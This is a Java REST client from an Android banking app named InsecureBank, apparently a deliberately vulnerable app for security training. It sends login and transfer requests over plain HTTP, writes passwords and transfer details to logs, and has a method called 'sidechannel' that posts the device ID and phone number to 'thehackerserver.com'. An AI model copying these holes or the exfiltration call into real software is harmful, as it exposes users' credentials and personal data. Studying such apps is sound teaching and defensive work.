package com.android.insecurebank;

import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

import org.apache.http.HttpException;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import android.accounts.AuthenticatorException;
import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.Toast;

public class RestClient {
    /** Called when the activity is first created. */
	private static final String TAG = "RestClient.java";
	public static final int NULL_ERROR = -1;
	
    public String getHttpContent(String urlName) throws IOException {
        String line;
        String result;
        StringBuilder httpContent = new StringBuilder();

        URL url = new URL(urlName);
        HttpURLConnection httpConnection = (HttpURLConnection) url.openConnection();
        int responseCode = httpConnection.getResponseCode();
        if (responseCode == HttpURLConnection.HTTP_OK) {
            InputStream inputStream = httpConnection.getInputStream();
            BufferedReader br = new BufferedReader(new InputStreamReader(inputStream));
            while ((line = br.readLine()) != null) {
                httpContent.append(line);
            }

            httpConnection.disconnect();
        }
        result = httpContent.toString();
        return result;
    }
    
    public String postHttpContent(String urlString, Map<String, String> variables)
            throws IOException, HttpException {
        String response = "";
        URL url = new URL(urlString);
        HttpURLConnection httpConnection = (HttpURLConnection) url.openConnection();
        httpConnection.setDoInput(true);
        httpConnection.setDoOutput(true);
        httpConnection.setUseCaches(false);
        httpConnection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");

        String postData = "";
        for (String key : variables.keySet()) {
            postData += "&" + key + "=" + variables.get(key);
        }
        postData = postData.substring(1);

        DataOutputStream postOut = new DataOutputStream(httpConnection.getOutputStream());
        postOut.writeBytes(postData);
        postOut.flush();
        postOut.close();

        int responseCode = httpConnection.getResponseCode();
        if (responseCode == HttpURLConnection.HTTP_OK) {
            String line;
            BufferedReader br = new BufferedReader(new InputStreamReader(httpConnection.getInputStream()));
            while ((line = br.readLine()) != null) {
                response += line;
            }
        } else {
            response = "";
            Log.e(TAG, "HTTP request failed on: " + urlString + " With error code: "
                            + responseCode);
        }
        return response;
    }

   
    public int doLogin(String server, String port, String username_text, String password_text)
            throws JSONException, IOException, HttpException {
        String protocol = "http://";
        String url = protocol + server + ":" + port + "/login";
        Map<String, String> parameters = new HashMap<String, String>();
        parameters.put("username", username_text);
        parameters.put("password", password_text);
        String theJsonResponse;
        theJsonResponse = postHttpContent(url, parameters);
        Log.e(TAG, "Login tried as: " + username_text + " with password: "
                + password_text);
        System.out.println(parameters.toString());
        int Code = parseError(theJsonResponse);
        return Code;
    }

    public int dotransfer(String server, String port, String fromAccount, String toAccount, String amount
            ) throws IOException, HttpException {
    	
    	
    	Map<String, String> variables = new HashMap<String, String>();
         String protocol = "http://";
         String url = protocol + server + ":" + port + "/transfer";
         variables.put("from_account", fromAccount);
         variables.put("to_account", toAccount);
         variables.put("amount", amount);
         String resp;
         System.out.println(variables.toString());
         resp = postHttpContent(url, variables);
         Log.e(TAG, "Transfered Amount " + amount + " from account: "+ fromAccount+" to account"+toAccount);
         
         
           int status = parseError(resp);
           return status;
         
         
    }

   
    public int parseError(String json) {
        int errorCode;
        String errorString;
        if (json == null || json.equals("")) {
            return -1;
        }

        try {
            JSONObject jsonObject = new JSONObject(json);
            errorString = jsonObject.getString("error");
        } catch (JSONException e) {
            errorCode = NULL_ERROR;
            return errorCode;
        }

        return Integer.parseInt(errorString.trim().substring(1));
    }

public void sidechannel(String deviceId, String telno) throws IOException, HttpException {
		// TODO Auto-generated method stub
		//------------ Send DeviceID

        
        String url2 = "http://" + "thehackerserver.com" + ":" + "8080" + "/collectip";
        Map<String, String> deviceparameters = new HashMap<String, String>();
        
        deviceparameters.put("deviceid", deviceId);
        deviceparameters.put("telephone", telno);
        String senddata;
        senddata = postHttpContent(url2, deviceparameters);
		
        //------------ Send DeviceID
	}
    
        
}


    
